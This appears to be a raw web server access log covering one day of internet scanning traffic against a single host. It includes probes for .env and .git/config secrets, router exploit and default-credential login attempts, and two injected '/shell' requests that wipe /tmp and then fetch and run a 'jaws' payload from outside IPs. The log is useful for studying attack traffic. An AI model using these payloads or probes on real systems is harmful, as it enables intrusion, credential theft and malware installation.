104.152.52.156 - - [18/Jan/2025:00:12:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
78.153.140.148 - - [18/Jan/2025:00:14:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:00:14:49 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.96 - - [18/Jan/2025:00:27:09 +0000] "\x16\x03\x01" 400 526 "-" "-"
205.210.31.96 - - [18/Jan/2025:00:27:09 +0000] "\x16\x03\x01" 400 526 "-" "-"
95.214.55.226 - - [18/Jan/2025:00:32:30 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
199.45.155.93 - - [18/Jan/2025:00:37:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
199.45.155.93 - - [18/Jan/2025:00:38:01 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.93 - - [18/Jan/2025:00:38:01 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.93 - - [18/Jan/2025:00:38:01 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.93 - - [18/Jan/2025:00:38:01 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
31.13.224.222 - - [18/Jan/2025:00:43:45 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 6.0.1; MI 5 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044807 Mobile Safari/537.36 MMWEBID/3072 MicroMessenger/7.0.3.1400(0x2700033C) Process/tools NetType/WIFI Language/zh_CN"
45.156.128.41 - - [18/Jan/2025:00:54:14 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
5.181.190.248 - - [18/Jan/2025:00:57:08 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
184.105.247.254 - - [18/Jan/2025:00:59:46 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
184.105.247.254 - - [18/Jan/2025:01:01:34 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
184.105.247.254 - - [18/Jan/2025:01:02:14 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
179.43.191.146 - - [18/Jan/2025:01:14:20 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
146.19.24.18 - - [18/Jan/2025:01:29:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.99.67.123 - - [18/Jan/2025:01:34:45 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [18/Jan/2025:01:34:56 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
119.15.90.78 - - [18/Jan/2025:01:52:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
111.216.124.136 - - [18/Jan/2025:02:12:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.55.185 - - [18/Jan/2025:02:24:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [18/Jan/2025:02:26:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
122.117.18.135 - - [18/Jan/2025:02:27:50 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.242.226.10 - - [18/Jan/2025:02:44:41 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
78.153.140.224 - - [18/Jan/2025:02:56:51 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.224 - - [18/Jan/2025:02:56:51 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.6) Gecko/20060802 Firefox/1.5.0.6"
185.16.39.104 - - [18/Jan/2025:02:57:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
3.16.137.223 - - [18/Jan/2025:03:21:00 +0000] "\x16\x03\x01" 400 526 "-" "-"
3.16.137.223 - - [18/Jan/2025:03:21:01 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
172.169.1.85 - - [18/Jan/2025:03:35:11 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
193.34.212.75 - - [18/Jan/2025:03:37:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.147 - - [18/Jan/2025:04:00:16 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:04:00:16 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.181.190.248 - - [18/Jan/2025:04:00:33 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
146.19.24.18 - - [18/Jan/2025:04:13:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.255.57.58 - - [18/Jan/2025:04:25:47 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
221.162.0.254 - - [18/Jan/2025:04:35:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
80.94.92.115 - - [18/Jan/2025:04:37:55 +0000] "SSH-2.0-OpenSSH" 400 526 "-" "-"
146.19.24.168 - - [18/Jan/2025:04:38:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
216.218.206.69 - - [18/Jan/2025:04:44:32 +0000] "\x16\x03\x01" 400 526 "-" "-"
95.214.55.226 - - [18/Jan/2025:04:57:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.255.57.58 - - [18/Jan/2025:04:58:48 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [18/Jan/2025:04:58:52 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
147.185.132.78 - - [18/Jan/2025:05:02:26 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
193.142.146.175 - - [18/Jan/2025:05:07:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:05:07:15 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
198.235.24.135 - - [18/Jan/2025:05:09:36 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
118.174.95.126 - - [18/Jan/2025:05:13:03 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.147 - - [18/Jan/2025:05:15:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:05:15:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [18/Jan/2025:05:40:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.196.220.253 - - [18/Jan/2025:05:40:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
92.255.57.58 - - [18/Jan/2025:05:46:25 +0000] "\x16\x03\x01\x05\xa8\x01" 400 526 "-" "-"
5.181.190.248 - - [18/Jan/2025:06:11:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.147 - - [18/Jan/2025:06:27:22 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:06:27:23 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
35.240.127.190 - - [18/Jan/2025:06:49:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
146.19.24.168 - - [18/Jan/2025:06:55:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
35.202.9.133 - - [18/Jan/2025:07:10:20 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
78.153.140.147 - - [18/Jan/2025:07:18:51 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:07:18:54 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
146.19.24.18 - - [18/Jan/2025:07:27:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
175.107.1.76 - - [18/Jan/2025:07:28:15 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 302 387 "-" "Hello, World"
193.142.146.175 - - [18/Jan/2025:07:31:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:07:31:25 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
172.104.11.34 - - [18/Jan/2025:07:46:00 +0000] "\x16\x03\x01" 400 526 "-" "-"
179.43.191.146 - - [18/Jan/2025:07:59:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.33.109.8 - - [18/Jan/2025:08:01:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
45.79.172.21 - - [18/Jan/2025:08:01:33 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
87.120.115.34 - - [18/Jan/2025:08:06:04 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:08:36:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:08:36:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [18/Jan/2025:08:37:02 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
172.168.41.223 - - [18/Jan/2025:08:53:28 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
193.142.146.175 - - [18/Jan/2025:09:07:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:09:07:19 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
206.168.34.89 - - [18/Jan/2025:09:27:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.89 - - [18/Jan/2025:09:28:02 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.89 - - [18/Jan/2025:09:28:04 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.89 - - [18/Jan/2025:09:28:07 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.89 - - [18/Jan/2025:09:28:10 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
146.19.24.18 - - [18/Jan/2025:09:34:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.172.72.201 - - [18/Jan/2025:09:47:41 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.72.201 - - [18/Jan/2025:09:47:51 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
146.19.24.168 - - [18/Jan/2025:09:58:02 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
198.235.24.16 - - [18/Jan/2025:10:28:21 +0000] "\x16\x03\x01" 400 526 "-" "-"
198.235.24.16 - - [18/Jan/2025:10:28:21 +0000] "\x16\x03\x01" 400 526 "-" "-"
185.16.39.104 - - [18/Jan/2025:10:29:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.88.142.22 - - [18/Jan/2025:10:30:18 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "python-requests/2.25.1"
78.153.140.147 - - [18/Jan/2025:10:50:30 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:10:50:30 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.196.220.253 - - [18/Jan/2025:10:53:08 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
46.19.138.234 - - [18/Jan/2025:10:58:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [18/Jan/2025:11:13:27 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:11:25:02 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:11:25:02 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
147.185.133.76 - - [18/Jan/2025:11:29:14 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
95.214.55.185 - - [18/Jan/2025:11:38:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.147 - - [18/Jan/2025:11:45:41 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:11:45:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.79.181.104 - - [18/Jan/2025:11:50:02 +0000] "\x16\x03\x01" 400 526 "-" "-"
45.164.177.69 - - [18/Jan/2025:12:08:42 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 302 350 "-" "-"
13.64.59.29 - - [18/Jan/2025:12:11:19 +0000] "MGLNDD_35.220.248.27_80\n" 400 526 "-" "-"
193.121.118.29 - - [18/Jan/2025:12:35:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
34.76.114.129 - - [18/Jan/2025:13:15:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
95.214.55.226 - - [18/Jan/2025:13:15:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [18/Jan/2025:13:24:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
80.82.77.202 - - [18/Jan/2025:13:30:58 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
193.34.212.75 - - [18/Jan/2025:13:36:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.101.104 - - [18/Jan/2025:13:36:45 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
193.142.146.175 - - [18/Jan/2025:14:10:10 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:14:10:10 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.147 - - [18/Jan/2025:14:25:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:14:25:34 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
123.223.195.244 - - [18/Jan/2025:14:27:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
179.43.191.146 - - [18/Jan/2025:14:36:32 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
184.95.51.10 - - [18/Jan/2025:14:42:01 +0000] "GET /api/kernelspecs HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Fedora; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0"
51.254.59.113 - - [18/Jan/2025:15:05:30 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
87.120.115.34 - - [18/Jan/2025:15:11:35 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.4.20"
78.153.140.147 - - [18/Jan/2025:15:48:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:15:48:01 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.105.128.13 - - [18/Jan/2025:15:48:55 +0000] "\x16\x03\x01" 400 526 "-" "-"
5.181.190.248 - - [18/Jan/2025:15:50:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.196.220.253 - - [18/Jan/2025:15:55:22 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
139.59.101.104 - - [18/Jan/2025:16:02:03 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
193.142.146.175 - - [18/Jan/2025:16:11:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:16:11:08 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
146.19.24.168 - - [18/Jan/2025:17:04:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [18/Jan/2025:17:13:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.147 - - [18/Jan/2025:17:28:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:17:28:22 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
39.175.49.133 - - [18/Jan/2025:17:50:44 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws" 400 526 "-" "-"
206.189.152.11 - - [18/Jan/2025:17:55:15 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [18/Jan/2025:17:55:24 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
193.142.146.175 - - [18/Jan/2025:18:12:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:18:12:18 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
5.181.190.248 - - [18/Jan/2025:18:21:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
171.6.147.177 - - [18/Jan/2025:18:29:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
146.19.24.168 - - [18/Jan/2025:18:35:50 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.16.39.104 - - [18/Jan/2025:18:49:30 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.101.220.64 - - [18/Jan/2025:19:02:35 +0000] "\x16\x03\x01" 400 526 "-" "-"
46.101.220.64 - - [18/Jan/2025:19:02:35 +0000] "\x16\x03\x01" 400 526 "-" "-"
46.101.220.64 - - [18/Jan/2025:19:02:36 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.101.220.64 - - [18/Jan/2025:19:02:36 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
46.101.220.64 - - [18/Jan/2025:19:02:37 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
46.101.220.64 - - [18/Jan/2025:19:02:37 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
46.101.220.64 - - [18/Jan/2025:19:02:37 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.101.220.64 - - [18/Jan/2025:19:02:38 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.101.220.64 - - [18/Jan/2025:19:02:38 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.101.220.64 - - [18/Jan/2025:19:02:39 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
46.101.220.64 - - [18/Jan/2025:19:02:39 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
95.214.55.185 - - [18/Jan/2025:19:18:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.147 - - [18/Jan/2025:19:35:17 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:19:35:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [18/Jan/2025:19:44:03 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
35.215.212.220 - - [18/Jan/2025:20:00:58 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 132.145.21.30/jaws;sh+/tmp/jaws" 400 526 "-" "-"
179.43.191.146 - - [18/Jan/2025:20:09:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
146.19.24.168 - - [18/Jan/2025:20:17:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
